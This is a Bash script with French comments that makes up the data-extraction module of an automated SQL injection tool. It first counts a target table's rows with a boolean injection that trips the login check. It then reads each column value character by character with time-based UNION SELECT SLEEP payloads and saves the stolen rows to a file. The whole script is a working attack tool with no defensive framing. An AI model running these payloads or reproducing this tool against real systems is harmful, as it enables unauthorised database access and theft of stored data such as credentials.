#!/bin/bash

# Stockage des résultats
declare -A FOUND_DATAS

# Fonction pour l'extraction des données
extract_data() {
    local db="$1"
    local table="$2"
    shift 2
    local columns=("$@")

    sql_log "INFO" "Démarrage de l'extraction des données"
    local count=0
    
    # Phase 1: Détection du nombre d'enregistrements
    sql_log "QUERY" "Détection du nombre d'enregistrements"
    for val in $(seq 1 $MAX_ATTEMPTS); do
        loading_animation "Test avec COUNT = $val"
        
        local payload="' OR (SELECT COUNT(*) FROM \`$db\`.\`$table\`)=${val};-- -"
        local response=$(send_request "$payload")
        local message=$(echo "$response" | jq -r '.message // empty')
        
        if [[ "$message" == *"Authentification réussie"* ]]; then
            count=$val
            sql_log "INFO" "Nombre d'enregistrements détecté : $count"
            break
        fi
        sleep $REQUEST_DELAY
    done

    if [[ $count -eq 0 ]]; then
        sql_log "ERROR" "Impossible de déterminer le nombre d'enregistrements"
        return 1
    fi

    # Réinitialisation du tableau de résultats
    FOUND_DATAS=()

    # Phase 2: Extraction des données pour chaque colonne
    for col in "${columns[@]}"; do
        # Tableau temporaire pour stocker les valeurs de cette colonne
        local column_data=()

        # Extraction des données ligne par ligne
        for offset in $(seq 0 $((count - 1))); do
            local row_data=""

            # Extraction caractère par caractère
            for position in $(seq 1 $MAX_LENGTH); do
                local found=false

                for char in $(echo -n "$CHARSET" | sed 's/\(.\)/\1 /g'); do
                    loading_animation "Test position $position avec '$char'"
                    
                    local injection="' UNION SELECT CASE WHEN (SUBSTRING((SELECT \`$col\` FROM \`$db\`.\`$table\` LIMIT 1 OFFSET ${offset}), ${position}, 1) = '${char}') THEN SLEEP(${THRESHOLD}) ELSE NULL END, NULL, NULL-- -"
                    local duration=$(test_injection "$injection")

                    if (( $(echo "$duration > $THRESHOLD" | bc -l) )); then
                        row_data+="$char"
                        sql_log "INFO" "Caractère trouvé: $char"
                        found=true
                        break
                    fi
                done

                if [ "$found" = false ]; then
                    break
                fi
                sleep $REQUEST_DELAY
            done

            # Ajouter la ligne extraite si non vide
            if [ -n "$row_data" ]; then
                column_data+=("$row_data")
                sql_log "INFO" "Valeur extraite pour $col (ligne $((offset + 1))) : $row_data"
            fi
        done

        # Stocker les données de cette colonne
        FOUND_DATAS[$col]=$(printf '%s\n' "${column_data[@]}" | tr '\n' '|' | sed 's/|$//')
    done

    # Sauvegarde des résultats
    save_data_results "$db" "$table" "${columns[@]}"
    
    # Affichage du résumé
    display_data_summary
}

# Fonction pour sauvegarder les résultats
save_data_results() {
    local db="$1"
    local table="$2"
    shift 2
    local columns=("$@")

    local result_file="data_${db}_${table}_$(date '+%Y%m%d_%H%M%S').txt"
    {
        echo "Résultats de l'extraction des données - $(date '+%Y-%m-%d %H:%M:%S')"
        echo "URL cible: $TARGET_URL"
        echo "Base de données: $db"
        echo "Table: $table"
        echo "----------------------------------------"
        
        # Affichage des données extraites
        for col in "${columns[@]}"; do
            echo "Colonne: $col"
            # Récupérer les valeurs de la colonne et les afficher
            IFS='|' read -ra data_rows <<< "${FOUND_DATAS[$col]}"
            for row in "${data_rows[@]}"; do
                echo "  $row"
            done
        done
    } > "$result_file"

    sql_log "INFO" "Résultats sauvegardés dans $result_file"
}

# Fonction pour afficher le résumé
display_data_summary() {
    echo -e "\n${BLUE}╔═══════════════════════════ DONNÉES EXTRAITES ═══════════════════════════╗"
    echo "║                                                                         ║"
    
    # Afficher les données pour chaque colonne
    for col in "${!FOUND_DATAS[@]}"; do
        printf "║ Colonne: %-20s                                        ║\n" "$col"
        
        # Récupérer et afficher les valeurs
        IFS='|' read -ra data_rows <<< "${FOUND_DATAS[$col]}"
        for row in "${data_rows[@]}"; do
            printf "║   > %-50s                         ║\n" "$row"
        done
    done
    
    echo "║                                                                         ║"
    printf "║  Total: %-3d lignes extraites                                           ║\n" "${#data_rows[@]}"
    echo "╚═════════════════════════════════════════════════════════════════════════╝"
    echo -e "${DEFAULT}"
}

# Si le script est exécuté directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Vérification des paramètres
    if [[ $# -lt 3 ]]; then
        echo "Usage: $0 <database> <table> <column1> [column2] ..."
        exit 1
    fi
    
    extract_data "$@"
fi
